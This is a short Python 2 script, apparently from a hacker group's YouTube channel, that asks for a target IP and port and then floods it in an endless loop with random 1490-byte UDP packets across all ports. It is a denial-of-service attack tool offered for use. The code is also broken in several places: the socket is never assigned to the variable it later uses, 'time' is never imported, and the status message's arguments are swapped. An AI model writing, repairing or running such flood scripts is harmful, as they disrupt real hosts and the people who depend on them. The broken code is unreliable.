import os
import sys
import random
import socket
#########

socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
os.system("clear")
os.system("figlet Lz-X3")
print
print ("script.ThaiLand")
print ("YouTube Lz-X3")
print ("DedSec Cyber Team")
print
ip = raw_input("IP TARGET : ")
port = input("Port : ")

os.system("clear")
os.system("figlet Londing...")
time.sleep(5)

os.system("clear")
time.sleep(2)
sent = 0

while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Attacking %s sent packages %s at the port %s "%(sent,ip,port)
     if port == 65534:
       port = 1
